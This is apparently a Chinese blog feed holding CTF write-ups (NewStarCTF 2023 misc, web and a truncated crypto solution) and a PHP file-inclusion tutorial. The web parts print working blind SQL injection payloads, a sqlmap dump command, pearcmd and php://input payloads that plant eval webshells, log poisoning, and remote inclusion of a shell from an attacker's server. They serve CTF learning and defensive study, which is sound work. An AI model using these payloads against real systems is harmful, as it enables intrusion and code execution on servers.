class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;newusbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/posts/04d1547e2896/image-20231010173331969.png" class="" title="image-20231010173331969"><h3 id="滴滴滴"><a href="#滴滴滴" class="headerlink" title="滴滴滴"></a>滴滴滴</h3><p>打开音频听了下，应该是DTMF拨号音</p><p>可以使用工具dtmf2num来将音频转化为拨号数字</p><p>下载链接：<a href="http://aluigi.altervista.org/mytoolz/dtmf2num.zip">http://aluigi.altervista.org/mytoolz/dtmf2num.zip</a></p><p>或者使用在线网站：<a href="http://dialabc.com/sound/detect/index.html">Detect DTMF Tones (dialabc.com)</a></p><p>得到一串数字<code>52563319066</code></p><img src="/posts/04d1547e2896/image-20231010180257407.png" class="" title="image-20231010180257407"><p>而另一个附件既然是jpg文件，那就尝试用steghide分离下</p><p>很自然的想到用刚刚得到的数字作为密码</p><img src="/posts/04d1547e2896/image-20231010193605211.png" class="" title="image-20231010193605211"><p>得到flag</p><img src="/posts/04d1547e2896/image-20231010193632197.png" class="" title="image-20231010193632197"><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h3><p>测试<code>TMP0929&#39; AND 1=1 -- qwe</code>回显正常，说明存在注入点</p><p>判断字段数，直到<code>TMP0929&#39; ORDER BY 6 -- qwe</code>无回显</p><p>说明有5个字段</p><p>尝试联合注入时回显<code>no union</code>，说明union被过滤</p><p>尝试盲注</p><p>首先是数据库名长度</p><p><code>TMP0919&#39; AND LENGTH(DATABASE())&gt;=4 -- QWE</code>时显示id not exists，说明长度为3</p><p>开始爆库名</p><p><code>TMP0919&#39; AND SUBSTR(DATABASE(),1,1)=&#39;a&#39;-- QWE</code></p><p>爆出数据库名为ctf</p><p>开始爆表名</p><p><code>TMP0919&#39; AND SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=&#39;ctf&#39; LIMIT 0,1),1,1)=&#39;a&#39; -- QWE</code></p><p>除了grades，还爆出一个here_is_flag表</p><p>接下来的任务交给sqlmap就行了</p><p><code>python sqlmap.py -u http://f9021176-79c7-4df7-93b8-05d58756a8b6.node4.buuoj.cn:81/?id=TMP0919  --technique B -D ctf -T here_is_flag -C flag --dump --fresh-queries --delay=1</code></p><p>得到flag</p><img src="/posts/04d1547e2896/image-20231011134256665.png" class="" title="image-20231011134256665"><h3 id="include-🍐"><a href="#include-🍐" class="headerlink" title="include 🍐"></a>include 🍐</h3><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>`?file=phpinfo</code>查看phpinfo</p><p>提示查看argc和argv寄存器</p><img src="/posts/04d1547e2896/image-20231011144030704.png" class="" title="image-20231011144030704"><p>接下来如何利用这两个全局变量可以参考文章<a href="https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合/">register_argc_argv与include to RCE的巧妙组合 - Longlone’s Blog</a></p><p>利用pear上传一句话木马</p><p><code>?file=pearcmd&amp;+config-create+/&lt;?=eval($_POST[1])?&gt;+/tmp/evil.php</code></p><img src="/posts/04d1547e2896/image-20231011155434829.png" class="" title="image-20231011155434829"><p>使用蚁剑连接</p><img src="/posts/04d1547e2896/image-20231011155542712.png" class="" title="image-20231011155542712"><p>得到flag</p><p><img src="wp/image-20231011155731961.png" alt="image-20231011155731961"></p>]]></content>
      
      
      <categories>
          
          <category> NewStarCTF2023 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/posts/8f6810bb2033/"/>
      <url>/posts/8f6810bb2033/</url>
      
        <content type="html"><![CDATA[<h2 id="本地文件包含（LFL）"><a href="#本地文件包含（LFL）" class="headerlink" title="本地文件包含（LFL）"></a>本地文件包含（LFL）</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>文件包含漏洞的产生原因是 PHP 语言在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p><p>当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>利用条件：</strong></p><blockquote><p>（1）include()等函数通过动态变量的方式引入包含文件； （2）用户能够控制该动态变量。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>()<span class="comment">//使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</span></span><br><span class="line"><span class="keyword">include_once</span>()<span class="comment">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>()<span class="comment">//使用此函数，只要程序执行，立即调用此函数包含文件发生错误时，会输出错误信息并立即终止程序。</span></span><br><span class="line"><span class="keyword">require_once</span>()<span class="comment">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span></span><br></pre></td></tr></table></figure><p>通常情况下，本地文件包含漏洞可以结合文件上传漏洞使用</p><p>通过文件上传漏洞上传的图片中写入恶意代码，然后用 LFI 包含调用，就会执行图片里的PHP代码</p><h3 id="包含Apache日志Getshell"><a href="#包含Apache日志Getshell" class="headerlink" title="包含Apache日志Getshell"></a>包含Apache日志Getshell</h3><p>如果目标网站存在文件包含漏洞，但是没有可以包含的文件时，可以考虑利用Apache服务的access.log文件</p><p><code>access.log</code>文件记录了客户端每次请求的相关信息； 当我们访问一个不存在的资源时<code>access.log</code>文件仍然会记录这条资源信息。默认位置：<code>/var/log/httpd/access_log</code></p><p>我们就可以尝试访问<code>http://www.vuln.com/&lt;?php phpinfo(); ?&gt;</code></p><p>Apache会将这条信息记录在access.log文件中，这时如果我们访问access.log文件，就会触发文件包含漏洞。</p><p>理论上是这样的，但是实际上却是输入的代码被转义无法解析。</p><p>攻击者可以通过burpsuite进行抓包在http请求包里面将转义的代码改为正常的测试代码就可以绕过。</p><p>这时再查看Apache日志文件，显示的就是正常的测试代码。</p><p>这时访问：<code>http://www.vuln.com/index.php?arg=/var/log/httpd/access_log</code>，即可成功执行代码</p><h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><div class="table-container"><table><thead><tr><th>伪协议</th><th>功能</th></tr></thead><tbody><tr><td>file://</td><td>访问本地文件系统</td></tr><tr><td>http://</td><td>访问 HTTP(s) 网址</td></tr><tr><td>php://</td><td>访问各个输入/输出流</td></tr><tr><td>phar://</td><td>PHP 归档</td></tr><tr><td>zip://</td><td>压缩流</td></tr></tbody></table></div><ol><li><p>file://</p><p>用于访问本地文件，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是include()函数所决定的</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=file://C:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br></pre></td></tr></table></figure></li><li><p>data://</p><p>php 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。</p><p>该协议需要<code>allow_url_fopen:on</code>和<code>allow_url_include :on</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.data://text/plain,</span></span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#2.data://text/plain;base64,</span></span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain;<span class="built_in">base64</span>,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure></li><li><p>php://</p><p>在CTF中经常使用的是 <code>php://filter</code> 和 <code>php://input</code></p><p>php://filter用于<strong>读取源码</strong>，php://input用于<strong>执行</strong>php代码(post中的语句)</p><p>php://input的使用条件是<code>allow_url_include : on</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1. php://filter/read=convert.base64-encode/resource=[文件名]  //读取文件源码</span></span><br><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br><span class="line"></span><br><span class="line"><span class="comment">#2.php://input + [POST DATA]执行php代码</span></span><br><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分] &lt;?php phpinfo(); ?&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.若有写入权限，[POST DATA部分] 写入一句话木马</span></span><br><span class="line">&lt;?php fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure></li><li><p>zip:// &amp; bzip2:// &amp; zlib://</p><p><code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件</p><p>更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等</p><p><strong>示例：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</span><br><span class="line"><span class="comment">&lt;!--压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传--&gt;</span></span><br><span class="line">http://127.0.0.1/include.php?file=zip://C:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br><span class="line"></span><br><span class="line">2.compress.bzip2://file.bz2</span><br><span class="line"><span class="comment">&lt;!--压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）--&gt;</span></span><br><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://C:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br><span class="line"></span><br><span class="line">3.compress.zlib://file.gz </span><br><span class="line"><span class="comment">&lt;!--压缩 phpinfo.txt 为 phpinfo.gz--&gt;</span></span><br><span class="line">http://127.0.0.1/include.php?file=compress.zlib://C:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br></pre></td></tr></table></figure></li></ol><h2 id="远程文件包含（RFL）"><a href="#远程文件包含（RFL）" class="headerlink" title="远程文件包含（RFL）"></a>远程文件包含（RFL）</h2><p>当<code>php.ini</code>中开启<code>allow_url_include</code>、<code>allow_url_fopen</code>时，存在该漏洞</p><p>我们可以在远程文件中编写创建一句话木马的php代码</p><p>例如我们上传<code>shell.txt</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg=http://攻击者的VPS/shell.txt</span><br></pre></td></tr></table></figure><p><code>shell.txt</code>中写入如下内容</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    fputs(fopen(<span class="string">&#x27;./shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[123]) ?&gt;&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><ol><li>禁止远程文件包含 <code>allow_url_include=off</code></li><li>配置 <code>open_basedir=指定目录</code>，限制访问区域。</li><li>过滤<code>../</code>等特殊符号</li><li>修改Apache日志文件的存放地址</li><li>开启魔术引号 <code>magic_quotes_qpc=on</code></li><li>尽量不要使用动态变量调用文件，直接写要包含的文件。</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF2023 Week2题解</title>
      <link href="/posts/843a2f5ea22b/"/>
      <url>/posts/843a2f5ea22b/</url>
      
        <content type="html"><![CDATA[<p>NewStarCTF2023，或者应该叫OldBirdCTF🤣本文为第二周所有题目的题解，可能与官方wp有出入，请见谅。</p><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><p>记录一下第二周的短暂登顶</p><img src="/posts/843a2f5ea22b/image-20231015205225717.png" class="" title="image-20231015205225717"><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="partial-decrypt"><a href="#partial-decrypt" class="headerlink" title="partial decrypt"></a>partial decrypt</h3><p>源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p*q </span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line">dp = inverse(e, (p-<span class="number">1</span>))</span><br><span class="line">dq = inverse(e, (q-<span class="number">1</span>))</span><br><span class="line">m1 = <span class="built_in">pow</span>(c,dp, p)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c,dq, q)</span><br><span class="line">q_inv = inverse(q, p)</span><br><span class="line">h = (q_inv*(m1-m2)) % p</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m2 =&#x27;</span>, m2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;h =&#x27;</span>, h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q =&#x27;</span>, q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m2 = 4816725107096625408335954912986735584642230604517017890897348901815741632668751378729851753037917164989698483856004115922538576470127778342121497852554884</span></span><br><span class="line"><span class="comment"># h = 4180720137090447835816240697100630525624574275</span></span><br><span class="line"><span class="comment"># q = 7325294399829061614283539157853382831627804571792179477843187097003503398904074108324900986946175657737035770512213530293277111992799331251231223710406931</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该题与<strong>已知(p,q,dp,dq,c) 求m的题型</strong>类似</p><p>原理如下</p><ul><li><p>dq：dq ≡ d mod(q - 1)</p></li><li><p>dp：dp ≡ d mod(p - 1)</p></li><li><p>由费马小定理:</p><p>​        <script type="math/tex">\because d = dp + k_p * (p - 1) = dq + k_q * (q - 1)             \\   \therefore m1 \equiv c^d \mod p \equiv c^{dp + k_p * (p - 1)} \mod p \equiv c^{dp} \mod p                          \\ m2 \equiv c^d \mod q \equiv c^{dq + k_q * (q - 1)} \mod q \equiv c^{dq} \mod q</script></p><p>即</p><script type="math/tex; mode=display">m1 \equiv c^d\ mod p \quad ① \\ m2 \equiv 